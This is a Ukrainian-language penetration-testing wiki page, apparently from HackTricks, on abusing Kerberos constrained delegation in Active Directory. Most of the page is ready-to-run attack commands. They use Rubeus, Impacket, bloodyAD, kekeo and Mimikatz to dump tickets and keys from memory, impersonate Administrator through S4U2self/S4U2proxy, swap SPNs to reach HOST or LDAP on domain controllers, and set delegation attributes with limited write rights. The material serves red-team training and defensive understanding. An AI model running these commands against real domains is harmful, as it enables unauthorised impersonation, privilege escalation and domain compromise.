# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

За допомогою цього Domain admin може **дозволити** комп'ютеру **імітувати користувача або інший комп'ютер** перед будь-яким **service** на машині.

- **Service for User to self (_S4U2self_):** Якщо **service account** має значення _userAccountControl_, яке містить [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), то він може отримати TGS для себе (для service) від імені будь‑якого іншого користувача.
- **Service for User to Proxy(_S4U2proxy_):** **service account** може отримати TGS від імені будь‑якого користувача до сервісу, вказаного в **msDS-AllowedToDelegateTo**. Для цього йому спочатку потрібен TGS від цього користувача до себе, але він може використати S4U2self, щоб отримати цей TGS перед запитом іншого.

**Примітка**: Якщо користувач позначений як ‘_Account is sensitive and cannot be delegated_’ в AD, ви **не зможете impersonate** його.

Це означає, що якщо ви compromise the hash сервісу, то можете impersonate користувачів і отримати доступ від їхнього імені до будь‑якого **service** на вказаних машинах (можливий privesc).

Крім того, ви отримаєте доступ не лише до service, який користувач може impersonate, а й до будь‑якого іншого service, бо SPN (the service name requested) не перевіряється (у ticket ця частина не зашифрована/не підписана). Тому, якщо ви маєте доступ до CIFS service, ви також можете отримати доступ до HOST service, використовуючи прапорець /altservice в Rubeus, наприклад. Та сама слабкість SPN swapping зловживається в Impacket getST -altservice та інших інструментах.

Також доступ до LDAP service на DC — це те, що потрібно для експлуатації DCSync.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation notes (2025+)

З початку Windows Server 2012/2012 R2 KDC підтримує constrained delegation між доменами/лісами через S4U2Proxy extensions. Сучасні збірки (Windows Server 2016–2025) зберігають цю поведінку і додають два PAC SIDs для позначення protocol transition:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) — коли користувач пройшов звичайну автентифікацію.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) — коли сервіс підтвердив ідентичність через protocol transition.

Очікуйте `SERVICE_ASSERTED_IDENTITY` всередині PAC, коли protocol transition використовується між доменами, що підтверджує успішність кроку S4U2Proxy.

### Impacket / Linux tooling (altservice & full S4U)

Останні версії Impacket (0.11.x+) реалізують той самий S4U chain та SPN swapping, що й Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Якщо ви віддаєте перевагу forging the user ST first (e.g., offline hash only), pair **ticketer.py** with **getST.py** for S4U2Proxy. See the open Impacket issue #1713 for current quirks (KRB_AP_ERR_MODIFIED when the forged ST doesn't match the SPN key).

### Автоматизація налаштування делегування з low-priv creds

Якщо ви вже маєте **GenericAll/WriteDACL** над комп'ютерним або сервісним обліковим записом, ви можете віддалено встановити потрібні атрибути без RSAT, використовуючи **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Це дозволяє побудувати constrained delegation шлях для privesc без привілеїв DA, щойно ви зможете записувати ці атрибути.

- Крок 1: **Отримайте TGT дозволеного сервісу**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Існують **інші способи отримати TGT ticket** або **RC4** чи **AES256** не будучи SYSTEM на комп'ютері, наприклад Printer Bug, unconstrain delegation, NTLM relaying та зловживання Active Directory Certificate Service
>
> **Маючи лише цей TGT ticket (або його хеш), ви можете виконати цю атаку без компрометації всього комп'ютера.**

- Крок 2: **Отримати TGS для сервісу impersonating the user**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Більше інформації на ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) та [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Джерела
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
